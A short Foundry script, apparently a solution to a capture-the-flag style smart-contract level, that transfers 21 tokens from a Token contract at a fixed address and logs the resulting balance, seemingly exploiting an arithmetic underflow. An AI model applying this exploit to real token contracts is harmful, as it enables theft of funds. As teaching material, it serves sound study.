// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "../src/Token.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TokenSolution is Script {

    address target = 0x862c24EA09c41b939DAc9A5f438f0EC74b2F8CC6;
    Token public token = Token(target);

    function run() external {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        token.transfer(address(777), 21);
        console.log("balance: ", token.balanceOf(vm.envAddress("MY_ADDRESS")));
        vm.stopBroadcast();
    }
}